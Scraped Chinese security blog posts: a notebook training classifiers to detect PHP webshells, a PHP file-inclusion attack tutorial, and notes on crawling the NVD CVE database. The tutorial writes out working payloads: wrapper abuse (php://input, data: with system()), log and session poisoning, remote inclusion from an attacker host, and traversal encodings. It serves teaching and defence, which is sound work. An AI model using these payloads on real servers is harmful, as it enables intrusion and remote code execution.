&quot;LongestWord&quot;, &quot;SignatureNasty&quot;, &quot;Compression&quot;] for i in List: with open(i, &quot;r&quot;) as f: data &#x3D; f.read() for j in range(len(Features)): value &#x3D; tests[j].calculate(data, i) dicts[Features[j]].append(value) return Length, Entropy, LongestWord, SignatureNasty, Compression 处理数据将数据从文件夹读取出来1234567891011def listFile(path): fileList &#x3D; [] for root, dirs, files in os.walk(path): for i in files: completeName &#x3D; os.path.join(root, i) fileList.append(completeName) return fileListshellPath &#x3D; &quot;buf&#x2F;shell&quot;commonPath &#x3D; &quot;buf&#x2F;common&quot;shell &#x3D; listFile(shellPath)common &#x3D; listFile(commonPath) 创建标签1234shellLabel &#x3D; [1 for i in range(0, len(shell))]commonLabel &#x3D; [0 for i in range(0, len(common))]files &#x3D; shell + commonlabels &#x3D; shellLabel + commonLabel 计算各个文件的特征值12345678tests &#x3D; []tests.append(getLen())tests.append(Entropy())tests.append(LongestWord())tests.append(SignatureNasty())tests.append(Compression())Length, Entropy, LongestWord, SignatureNasty, Compression &#x3D; getFeatures(files) 将特征集合在一起，生成一个DataFrame12345import pandas as pddataDict &#x3D; &#123;&quot;label&quot;:labels, &quot;file&quot;:files, &quot;Length&quot;:Length, &quot;Entropy&quot;:Entropy, &quot;LongestWord&quot;:LongestWord, &quot;SignatureNasty&quot;:SignatureNasty, &quot;Compression&quot;:Compression&#125;dataSet &#x3D; pd.DataFrame(dataDict, columns&#x3D;[&#39;label&#39;, &#39;file&#39;, &quot;Length&quot;, &quot;Entropy&quot;, &quot;LongestWord&quot;, &quot;SignatureNasty&quot;, &quot;Compression&quot;]) 查看前五条数据1dataSet.head() label file Length Entropy LongestWord SignatureNasty Compression 0 1 buf/shell/small.php 15410 5.548091 129 4 0.254315 1 1 buf/shell/spy.php 73950 5.505197 153 30 0.284043 2 1 buf/shell/b374k-mini-shell-php.php.php 14427 6.036039 79 2 0.763083 3 1 buf/shell/b374k-2.4.php 101330 5.772806 5847 55 0.326221 4 1 buf/shell/Ani-Shell.php 87016 6.008172 3147 53 0.212260 查看数据的整体状况12345678910111213dataSet.info()&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;RangeIndex: 7847 entries, 0 to 7846Data columns (total 7 columns):label 7847 non-null int64file 7847 non-null objectLength 7847 non-null int64Entropy 7847 non-null float64LongestWord 7847 non-null int64SignatureNasty 7847 non-null int64Compression 7847 non-null float64dtypes: float64(2), int64(4), object(1)memory usage: 429.2+ KB 查看数据中两种数据所占比例1dataSet[&quot;label&quot;].value_counts() &#x2F; len(dataSet) 1230 0.7470371 0.252963Name: label, dtype: float64 有三个特征格式不正确，进行转换1234567891011121314151617181920import numpy as npdef traInt(x): try: r &#x3D; np.int64(x) return r except: return 0 def tranFlo(x): try: r &#x3D; np.float64(x) return r except: return 0dataSet[&quot;LongestWord&quot;] &#x3D; dataSet[&quot;LongestWord&quot;].map(lambda x:traInt(x))dataSet[&quot;SignatureNasty&quot;] &#x3D; dataSet[&quot;SignatureNasty&quot;].map(lambda x:traInt(x))dataSet[&quot;Compression&quot;] &#x3D; dataSet[&quot;Compression&quot;].map(lambda x:tranFlo(x))dataSet.head() label file Length Entropy LongestWord SignatureNasty Compression 0 1 buf/shell/small.php 15410 5.548091 129 4 0.254315 1 1 buf/shell/spy.php 73950 5.505197 153 30 0.284043 2 1 buf/shell/b374k-mini-shell-php.php.php 14427 6.036039 79 2 0.763083 3 1 buf/shell/b374k-2.4.php 101330 5.772806 5847 55 0.326221 4 1 buf/shell/Ani-Shell.php 87016 6.008172 3147 53 0.212260 12345678910111213dataSet.info()&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;RangeIndex: 7847 entries, 0 to 7846Data columns (total 7 columns):label 7847 non-null int64file 7847 non-null objectLength 7847 non-null int64Entropy 7847 non-null float64LongestWord 7847 non-null int64SignatureNasty 7847 non-null int64Compression 7847 non-null float64dtypes: float64(2), int64(4), object(1)memory usage: 429.2+ KB 分析数据五个特征对于两类文件的平均值 红色代表WebShell，绿色代表正常文件，下面雷同 导入画图的库12345678import seaborn as snsimport matplotlib.pyplot as plt%matplotlib inlineplt.style.use(&#39;seaborn&#39;)sns.set_context(&quot;poster&quot;)sns.set(font_scale&#x3D;2)pd.set_option(&#39;display.max_columns&#39;, 500) 将各个特征以图形化的界面展现出来12sns.kdeplot(dataSet.Length[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)sns.kdeplot(dataSet.Length[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True) 1&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c8a99e8&gt; 12sns.kdeplot(dataSet.Entropy[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)sns.kdeplot(dataSet.Entropy[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True) 1&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c842588&gt; 12sns.kdeplot(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)sns.kdeplot(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True) 1&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c82eb38&gt; 12sns.kdeplot(dataSet.SignatureNasty[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)sns.kdeplot(dataSet.SignatureNasty[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True) 1&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15a774dd8&gt; 12sns.kdeplot(dataSet.Compression[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)sns.kdeplot(dataSet.Compression[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True) 1&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15a6caf60&gt; 123456from mpl_toolkits.mplot3d import Axes3Dfig &#x3D; plt.figure(figsize&#x3D;(7,5))ax &#x3D; Axes3D(fig)ax.scatter(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 1].values, dataSet.Compression[dataSet.label &#x3D;&#x3D; 1], dataSet.Length[dataSet.label &#x3D;&#x3D; 1].values,c&#x3D;&#39;r&#39;) 1&lt;mpl_toolkits.mplot3d.art3d.Path3DCollection at 0x7fb15a618908&gt; 1234fig &#x3D; plt.figure(figsize&#x3D;(7,5))ax &#x3D; Axes3D(fig)ax.scatter(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 0].values, dataSet.Compression[dataSet.label &#x3D;&#x3D; 0], dataSet.Length[dataSet.label &#x3D;&#x3D; 0].values,c&#x3D;&#39;y&#39;) 1&lt;mpl_toolkits.mplot3d.art3d.Path3DCollection at 0x7fb158c9beb8&gt; 从图片中可以看出大部分的WebShell还是可以被区别出来的 计算出各个参数之间的皮尔逊系数12correlations &#x3D; dataSet.corr()correlations[&quot;label&quot;].sort_values(ascending&#x3D;False) 1234567label 1.000000SignatureNasty 0.391205Length 0.330383Compression 0.307060Entropy 0.251075LongestWord 0.219952Name: label, dtype: float64 按shell占比例将数据均匀分开1234567from sklearn.model_selection import StratifiedShuffleSplitsplit &#x3D; StratifiedShuffleSplit(n_splits&#x3D;1, test_size&#x3D;0.2, random_state&#x3D;36)for train_index, test_index in split.split(dataSet, dataSet[&quot;label&quot;]): train_set &#x3D; dataSet.loc[train_index] test_set &#x3D; dataSet.loc[test_index]train_set.head(10) label file Length Entropy LongestWord SignatureNasty Compression 4313 0 buf/common/Joomla_3.9.4-Stable-Full_Package/tw… 4038 5.136905 42 0 0.309807 2509 0 buf/common/Joomla_3.9.4-Stable-Full_Package/P2… 1345 5.223217 54 0 0.259480 7767 0 buf/common/phpmyadmin-master/RelationCleanup.php 15364 5.352547 51 0 0.073809 5180 0 buf/common/Joomla_3.9.4-Stable-Full_Package/de… 1333 5.224251 50 0 0.439610 4260 0 buf/common/Joomla_3.9.4-Stable-Full_Package/pd… 966 5.280909 40 0 0.548654 4419 0 buf/common/Joomla_3.9.4-Stable-Full_Package/jq… 3753 5.312287 47 0 0.356515 3485 0 buf/common/Joomla_3.9.4-Stable-Full_Package/in… 6869 5.321246 54 0 0.324793 6366 0 buf/common/WordPress-master/content-page (3).php 884 5.089887 32 0 0.488688 1894 1 buf/shell/a/php/f3b9d1c8e18467eecb31e0bb2c39c9… 1449 5.194428 122 0 0.641822 72 1 buf/shell/bypass-waf-2015-06-16-03.php 460 5.464458 86 0 0.645652 12345678910111213train_set.info()&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;Int64Index: 6277 entries, 4313 to 6235Data columns (total 7 columns):label 6277 non-null int64file 6277 non-null objectLength 6277 non-null int64Entropy 6277 non-null float64LongestWord 6277 non-null int64SignatureNasty 6277 non-null int64Compression 6277 non-null float64dtypes: float64(2), int64(4), object(1)memory usage: 392.3+ KB 将X，Y分离1234x_train &#x3D; train_set.drop(&quot;label&quot;, axis&#x3D;1).drop(&quot;file&quot;, axis&#x3D;1)y_train &#x3D; train_set.labelx_test &#x3D; test_set.drop(&quot;label&quot;, axis&#x3D;1).drop(&quot;file&quot;, axis&#x3D;1)y_test &#x3D; test_set.label 载入性能考核函数，并对结果进行评定1234567from sklearn.metrics import precision_score, recall_score, f1_scoredef score(name, y_test, y_pred): accu_score &#x3D; precision_score(y_test, y_pred) reca_score &#x3D; recall_score(y_test, y_pred) fin_score &#x3D; f1_score(y_test, y_pred) print(&quot;&#123;&#125;:\\n精度：&#123;&#125;\\n召回率：&#123;&#125;\\n综合得分：&#123;&#125;&quot;.format(name, accu_score, reca_score, fin_score)) 分类算法介绍最有影响力的十大数据挖掘算法中包含的分类算法 k近邻算法K最近邻(k-Nearest Neighbor，KNN)分类算法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。 SVM法支持向量机(support vector machine)是一种分类算法，通过寻求结构化风险最小来提高学习机泛化能力，实现经验风险和置信范围的最小化，从而达到在统计样本量较少的情况下，亦能获得良好统计规律的目的。通俗来讲，它是一种二类分类模型，其基本模型定义为特征空间上的间隔最大的线性分类器，即支持向量机的学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。 决策树决策树(Decision Tree）是在已知各种情况发生概率的基础上，通过构成决策树来求取净现值的期望值大于等于零的概率，评价项目风险，判断其可行性的决策分析方法，是直观运用概率分析的一种图解法。是一种十分常用的监管学习式分类方法。 朴素贝叶斯朴素贝叶斯方法是一种监督学习算法，它基于贝叶斯定理给定类变量值的每对特征之间的条件独立性的“简单”假设。在给定类变量$y$和从属特征向量$x*{1}$到$x*{n}$，贝叶斯定理表明了以下关系： $P(y \\mid x_1, \\dots, x_n) = \\frac{P(y) P(x_1, \\dots x_n \\mid y)} {P(x_1, \\dots, x_n)}$ 使用简单的条件独立假设 $P(x_i | y, x_1, \\dots, x*{i-1}, x*{i+1}, \\dots, x_n) = P(x_i | y),$ 对于所有$i$，这种关系被简化为 $P(y \\mid x_1, \\dots, x_n) = \\frac{P(y) \\prod_{i=1}^{n} P(x_i \\mid y)} {P(x_1, \\dots, x_n)}$ 由于$P(x_1, \\dots, x_n)$在输入时是常数，我们可以使用以下分类规则： $\\begin{align}\\begin{aligned}P(y \\mid x_1, \\dots, x_n) \\propto P(y) \\prod*{i=1}^{n} P(x_i \\mid y)\\Downarrow\\hat{y} = \\arg\\max_y P(y) \\prod*{i=1}^{n} P(x_i \\mid y),\\end{aligned}\\end{align}$ 我们可以使用最大后验（MAP）估计来估计$$P(y)和$P(x_i \\mid y)$; 前者是训练集中$y$类的相对频率。 神经网络神经网络由“神经元”构成，一个“神经元”是一个运算单元f，该运算单元在神经网络中称作激活函数，激活函数通常设定为sigmoid函数（也可以设为其他函数），它可以输入一组加权系数的量，对这个量进行映射，如果这个映射结果达到或者超过了某个阈值，输出一个量。 逻辑回归逻辑回归的模型是一个非线性模型，sigmoid函数，又称逻辑回归函数。但它其实是基于线性回归模型，因为除去sigmoid映射函数关系，其他的步骤，算法都是线性回归的。所以可以说，逻辑回归，都是以线性回归为理论支持的。 随机森林随机森林是一个包含多个决策树的分类器， 并且其输出的类别是由个别树输出的类别的众数而定。随机森林是集成学习思想下的产物，将许多棵决策树整合成森林，并合起来用来预测最终结果。 adaboostAdaboost是一种迭代算法，其核心思想是针对同一个训练集训练不同的分类器(弱分类器)，然后把这些弱分类器集合起来，构成一个更强的最终分类器（强分类器）。其算法本身是通过改变数据分布来实现的，它根据每次训练集之中每个样本的分类是否正确，以及上次的总体分类的准确率，来确定每个样本的权值。将修改过权值的新数据集送给下层分类器进行训练，最后将每次训练得到的分类器最后融合起来，作为最后的决策分类器。使用adaboost分类器可以排除一些不必要的训练数据特征，并放在关键的训练数据上面。 xgboost该算法思想就是不断地添加树，不断地进行特征分裂来生长一棵树，每次添加一个树，其实是学习一个新函数，去拟合上次预测的残差。当我们训练完成得到k棵树，我们要预测一个样本的分数，其实就是根据这个样本的特征，在每棵树中会落到对应的一个叶子节点，每个叶子节点就对应一个分数，最后只需要将每棵树对应的分数加起来就是该样本的预测值。 gbdt+lrGBDT算法的图示部分形如一棵倒过来的树，其根部即代表训练GBDT算法的原始数据集，经过树算法对原始数据的切分，可得到代表不同新特征的叶子节点。再将GBDT所得的叶子节点输入LR算法，经过线性分析和sigmoid映射，即可得到模型分类结果。 分类算法尝试K近邻法1234567891011from sklearn import neighborsknc &#x3D; neighbors.KNeighborsClassifier()K_model &#x3D;knc.fit(x_train, y_train)y_pred &#x3D; K_model.predict(x_test)score(&quot;k近邻&quot;, y_test, y_pred)k近邻:精度：0.8494983277591973召回率：0.6397984886649875综合得分：0.7298850574712645 支持向量机12345678910111213from sklearn import svmsvc &#x3D; svm.SVC()S_model &#x3D;svc.fit(x_train, y_train)y_pred &#x3D; S_model.predict(x_test)score(&quot;支持向量机&quot;, y_test, y_pred)&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;sklearn&#x2F;svm&#x2F;base.py:196: FutureWarning: The default value of gamma will change from &#39;auto&#39; to &#39;scale&#39; in version 0.22 to account better for unscaled features. Set gamma explicitly to &#39;auto&#39; or &#39;scale&#39; to avoid this warning. &quot;avoid this warning.&quot;, FutureWarning)支持向量机:精度：0.9824561403508771召回率：0.28211586901763225综合得分：0.4383561643835617 决策树1234567891011from sklearn import treedtc &#x3D; tree.DecisionTreeClassifier()D_model &#x3D; dtc.fit(x_train, y_train)y_pred &#x3D; D_model.predict(x_test)score(&quot;决策树&quot;, y_test, y_pred)决策树:精度：0.9149484536082474召回率：0.8942065491183879综合得分：0.9044585987261146 朴素贝叶斯分类1234567891011from sklearn.naive_bayes import GaussianNBBayes &#x3D; GaussianNB() #高斯朴素贝叶斯B_model &#x3D; Bayes.fit(x_train, y_train)y_pred &#x3D; B_model.predict(x_test)score(&quot;贝叶斯分类器&quot;, y_test, y_pred)贝叶斯分类器:精度：0.9148936170212766召回率：0.4332493702770781综合得分：0.5880341880341879 随机森林1234567891011from sklearn.ensemble import RandomForestClassifierforest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;15, random_state&#x3D;42, max_features&#x3D;3)forest_reg.fit(x_train, y_train)y_pred &#x3D; forest_reg.predict(x_test)score(&quot;随机森林&quot;, y_test, y_pred)随机森林:精度：0.9625668449197861召回率：0.906801007556675综合得分：0.933852140077821 ADABOOST1234567891011from sklearn.ensemble import AdaBoostClassifierada &#x3D; AdaBoostClassifier(n_estimators&#x3D;100,algorithm&#x3D;&#39;SAMME.R&#39;)A_model &#x3D;ada.fit(x_train, y_train)y_pred &#x3D; A_model.predict(x_test)score(&quot;AdaBoost&quot;, y_test, y_pred)AdaBoost:精度：0.9105691056910569召回率：0.8463476070528967综合得分：0.877284595300261 XGBOOST12345678910111213141516171819202122232425262728293031323334import xgboost as xgbparams &#x3D; &#123; &#39;booster&#39;: &#39;gbtree&#39;, &#39;num_class&#39;: 2, ## 类别数，与 multisoftmax 并用 &#39;gamma&#39;: 0.1, ## 用于控制是否后剪枝的参数,越大越保守，一般0.1、0.2这样子。 &#39;max_depth&#39;: 12, ## 构建树的深度，越大越容易过拟合 &#39;lambda&#39;: 2, ## 控制模型复杂度的权重值的L2正则化项参数，参数越大，模型越不容易过拟合。 &#39;subsample&#39;: 0.7, ## 随机采样训练样本 &#39;colsample_bytree&#39;: 0.7, ## 生成树时进行的列采样 &#39;min_child_weight&#39;: 3, &#39;silent&#39;: 1, ## 设置成1则没有运行信息输出，最好是设置为0. &#39;eta&#39;: 0.007, &#39;seed&#39;: 1000, &#39;nthread&#39;: 4,&#125;params[&#39;eval_metric&#39;] &#x3D; &#39;error&#39;num_round &#x3D; 200dtest &#x3D; xgb.DMatrix( x_test, label&#x3D;y_test)dtrain &#x3D; xgb.DMatrix( x_train, label&#x3D;y_train)evallist &#x3D; [(dtest,&#39;test&#39;), (dtrain,&#39;train&#39;)]xgbo &#x3D; xgb.XGBClassifier(max_depth&#x3D;3, n_estimators&#x3D;10000, learn_rate&#x3D;0.01)xgbo.fit(x_train, y_train)y_pred &#x3D; xgbo.predict(x_test)score(&quot;xgboost&quot;, y_test, y_pred)&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;xgboost&#x2F;core.py:587: FutureWarning: Series.base is deprecated and will be removed in a future version if getattr(data, &#39;base&#39;, None) is not None and \\&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;xgboost&#x2F;core.py:588: FutureWarning: Series.base is deprecated and will be removed in a future version data.base is not None and isinstance(data, np.ndarray) \\xgboost:精度：0.9545454545454546召回率：0.8992443324937027综合得分：0.9260700389105059 GBDT+LR123456789101112from sklearn.ensemble import GradientBoostingClassifiergbm1 &#x3D; GradientBoostingClassifier(n_estimators&#x3D;50, random_state&#x3D;10, subsample&#x3D;0.6, max_depth&#x3D;7, min_samples_split&#x3D;900)G_model &#x3D;gbm1.fit(x_train, y_train)y_pred &#x3D; G_model.predict(x_test)score(&quot;GBDT &quot;, y_test, y_pred)GBDT :精度：0.9351351351351351召回率：0.871536523929471综合得分：0.9022164276401564 投票算法1234567891011121314from sklearn.ensemble import VotingClassifiervot &#x3D; VotingClassifier( estimators &#x3D; [(&#39;F&#39;, forest_reg), (&#39;X&#39;, xgbo)], voting &#x3D; &#39;soft&#39;)v_model &#x3D; vot.fit(x_train, y_train)y_pred &#x3D; v_model.predict(x_test)score(&quot;Voting&quot;, y_test, y_pred)Voting:精度：0.9624664879356568召回率：0.9042821158690176综合得分：0.9324675324675323 对随机森林进行参数优化测试Estimators参数调整1234567891011121314A_score &#x3D; []R_score &#x3D; []F_score &#x3D; []for i in range(1, 30): forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;i, random_state&#x3D;42, max_features&#x3D;2) forest_reg.fit(x_train, y_train) y_pred &#x3D; forest_reg.predict(x_test) A_score.append(precision_score(y_test, y_pred)) R_score.append(recall_score(y_test, y_pred)) F_score.append(f1_score(y_test, y_pred))plt.plot(range(1,30), A_score, c&#x3D;&#39;r&#39;)plt.plot(range(1,30), R_score, c&#x3D; &#39;g&#39;)plt.plot(range(1,30), F_score, ls&#x3D;&#39;--&#39;) 1[&lt;matplotlib.lines.Line2D at 0x7fb149b3c898&gt;] features参数调整1234567891011121314A_score &#x3D; []R_score &#x3D; []F_score &#x3D; []for i in range(1, 5): forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;11, random_state&#x3D;42, max_features&#x3D;i) forest_reg.fit(x_train, y_train) y_pred &#x3D; forest_reg.predict(x_test) A_score.append(precision_score(y_test, y_pred)) R_score.append(recall_score(y_test, y_pred)) F_score.append(f1_score(y_test, y_pred))plt.plot(range(1, 5), A_score, c&#x3D;&#39;r&#39;)plt.plot(range(1, 5), R_score, c&#x3D; &#39;g&#39;)plt.plot(range(1, 5), F_score, ls&#x3D;&#39;--&#39;) 1[&lt;matplotlib.lines.Line2D at 0x7fb149b13470&gt;] 尾声确定最终模型并将训练结果存储起来12345from sklearn.externals import joblibforest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;11, random_state&#x3D;42, max_features&#x3D;2)last_model &#x3D; forest_reg.fit(x_train, y_train)joblib.dump(last_model, &quot;model.pkl&quot;) 1[&#39;model.pkl&#39;] 读取模型的方法123from sklearn.externals import joblibjoblib.load(&quot;model.pkl&quot;) 123456RandomForestClassifier(bootstrap&#x3D;True, class_weight&#x3D;None, criterion&#x3D;&#39;gini&#39;, max_depth&#x3D;None, max_features&#x3D;2, max_leaf_nodes&#x3D;None, min_impurity_decrease&#x3D;0.0, min_impurity_split&#x3D;None, min_samples_leaf&#x3D;1, min_samples_split&#x3D;2, min_weight_fraction_leaf&#x3D;0.0, n_estimators&#x3D;11, n_jobs&#x3D;None, oob_score&#x3D;False, random_state&#x3D;42, verbose&#x3D;0, warm_start&#x3D;False) 最后还有一个验证集部分，因为代码写的比较乱就不放上来了，结果还不错，大部分马都没能逃过模型的“法眼”。除了网站安装文件被误报其他的没有毛病了。安装文件本来也就有很大的权限，而且正常运营的网站也不应该存在安装文件，防止被重置网站，这样我的模型还有了一个可以检测安装文件是否被删除的附加功能，很满意。。。。","categories":[{"name":"编程","slug":"编程","permalink":"https://canc3s.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python","slug":"python","permalink":"https://canc3s.github.io/tags/python/"},{"name":"机器学习","slug":"机器学习","permalink":"https://canc3s.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"webshell","slug":"webshell","permalink":"https://canc3s.github.io/tags/webshell/"}]},{"title":"php文件包含","slug":"php文件包含","date":"2019-02-10T15:30:04.000Z","updated":"2021-01-30T10:23:24.336Z","comments":true,"path":"2019/02/10/","link":"","permalink":"https://canc3s.github.io/2019/02/10/","excerpt":"","text":"本地文件包含的利用思路 通过日志写入任意代码进行包含攻击 利用上传点，上传正常文件包含webshell脚本 LFI With PHPInfo Assistance 包含session(默认php安装配置，获取sesion文件名) php文件包含php的文件包含函数： include() include_once() require() require_once() reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。 include() 如果出错的话，只会提出警告，会继续执行后续语句。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 可能存在文件包含漏洞的必要条件： 具有文件包含函数。 文件包含函数中存在动态变量。 1include $file; 攻击者能够控制该变量。 1$file = $_GET[&#x27;file&#x27;]; 分类LFI(Local File Inclusion)本地文件包含漏洞，是指能打开并包含本地文件的漏洞。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够远程包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害和很大。 但RFI的利用条件较为苛刻，需要php.ini中进行配置： allow_url_fopen = Onallow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。 在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认Off。 利用方法php伪协议php://input利用条件： allow_url_include = On。 对allow_url_fopen不做要求。 利用方法： 12345index.php?file&#x3D;php:&#x2F;&#x2F;inputPOST:&lt;?php phpinfo();?&gt; php://filter利用条件： 无 利用方法： 12index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php ^ 12index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php 可以直接读取经过base64加密后的文件源码。 phar://利用条件： php版本大于等于5.3.0 利用方法： 将php文件打包成zip压缩包，然后 指定绝对路径： 1index.php?file+phar:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;WWW&#x2F;test.zip&#x2F;test.php 或者相对路径： 1index.php?file&#x3D;phar:&#x2F;&#x2F;test.zip&#x2F;test.php zip://利用条件： php版本大于等于5.3.0 利用方法： 构造zip包 然后指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 1index.php?file&#x3D;zip:&#x2F;&#x2F;D:\\phpStudy\\WWW\\test.zip%23test.php 使用相对路径会包含失败。 data:URI schema利用条件： php版本大于等于php5.2.0 allow_url_fopen = On allow_url_include = On 利用方法： 1index.php?file&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;whoami&#39;);?&gt; ^ 1index.php?file&#x3D;data:text;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8%2b的base64解码为：&lt;?php phpinfo();?&gt;。 包含session利用条件： session文件路径已知 session文件内容可控 php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。 包含日志访问日志利用条件： 服务器日志文件路径已知 服务器日志文件可读 利用方式： 使用burp截包后修改。 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 ssh日志利用条件： ssh日志位置已知 ssh日志可读 日志位置默认情况下为 /var/log/auth.log 利用方式： 1ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost 包含environ利用条件： php以cgi方式运行，这样environ才会保存UA头。 environ文件存储位置已知，且environ文件可读。 利用方式： proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 包含上传文件利用条件： 文件上传路径 文件名 利用方式： 文件上传 绕过姿势指定前缀服务器代码： 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include &#x27;/var/www/html/&#x27;.$file;?&gt; 利用../或..\\ 编码绕过： 利用URL编码 ../ %2e%2e%2f ..\\ %2e%2e%5c 二次编码 ../ %252e%252e%252f ..\\ %252e%252e%255c 容器或服务器的编码方式 ../ %252e%252e%255c Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/ java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 指定后缀服务器代码： 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file.&#x27;/test/test.php&#x27;;?&gt; 利用URL特殊符号query(?)1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt? 则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php fragment(#)1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23 则包含的文件为 http://remoteaddr/remoteinfo.txt#/test/test.php 注意需要把#进行url编码为%23。 利用协议利用zip协议，注意要指定绝对路径 1index.php?file&#x3D;zip:&#x2F;&#x2F;D:\\phpStudy\\WWW\\fileinclude\\chybeta.zip%23chybeta 则拼接后为：zip://D:\\phpStudy\\WWW\\fileinclude\\chybeta.zip#chybeta/test/test.php 长度截断利用条件： php版本小于5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./，则后缀/test/test.php，在达到最大值后会被直接丢弃掉。 0字节截断利用条件：php版本小于5.3.4 1index.php?file&#x3D;phpinfo.txt%00 防御方案 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 做好文件的权限管理 对危险字符进行过滤等等","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://canc3s.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://canc3s.github.io/tags/php/"}]},{"title":"CVE 爬虫","slug":"CVE-爬虫","date":"2019-01-06T15:30:04.000Z","updated":"2021-01-30T15:40:54.978Z","comments":true,"path":"2019/01/06/","link":"","permalink":"https://canc3s.github.io/2019/01/06/","excerpt":"","text":"Python3爬国家漏洞信息库思路流程先确定要爬的网站并观察他URL的规律发现，当url为： 1https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F; 会显示出所有时间段的链接，点击2018年8月的链接时，他的url变成： 1https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F;2018&#x2F;8 不难发现规律是： 1https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F;年&#x2F;月 构造好爬取网站的url后开始提取网站内的数据，使用xpath，可以精准提取到页面里展示出来的所有漏洞名称和超链接，但xpath获取的超链接不完整 1&#x2F;vuln&#x2F;detail&#x2F;CVE-2018-0413 点击超链接之后发现真实地址是xpath提取的超链接加该网站的完整域名 1https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2018-0413 这样就有了进一步的思路，将具体月份内的所有漏洞列表的超链接拼接为可用的具体网址，存放在列表里，方便之后的遍历访问。 爬取并保存信息打开漏洞网址利用xpath将网页内的信息提取出来，按键值对有序的存放在该漏洞的字典中，其中Impact部分数据比较复杂。因此，在建两个字典分别存放3.0和2.0版本的具体影响。 因为每个网页中的字段数量不同，因此存在只有标题没有内容的情况，因此某些特定地方需要加判断来增加程序的健壮性 其次，存在很多内容存在样式，所以需要用strip和join进行去空格和拼接，字符串切片处理 将数据爬取下来后为了让数据更具有可读性，增加了翻译功能 增加功能使用随机请求头来减少拒绝请求的次数 